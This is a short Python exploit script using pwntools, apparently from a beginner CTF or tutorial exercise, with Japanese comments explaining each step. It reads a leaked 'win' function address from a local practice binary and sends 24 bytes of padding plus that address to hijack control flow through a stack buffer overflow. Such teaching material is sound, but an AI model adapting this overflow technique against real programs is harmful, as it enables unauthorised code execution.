from pwn import *

io = process("./p2")

win = io.readline()  # プロセスの出力した文字列から，一行読み取る
win = win[5:-1]  # win: と \n を取り除く

win = int(win, 16)  # intに変換
win = p64(win)  # p64でintをbytes型に変換

payload = b"A" * 24 + win  # 24バイトのA(適当な文字)とwin
io.sendline(payload)  # \nをつけて送信(入力)

io.interactive()  # 対話モードに入る
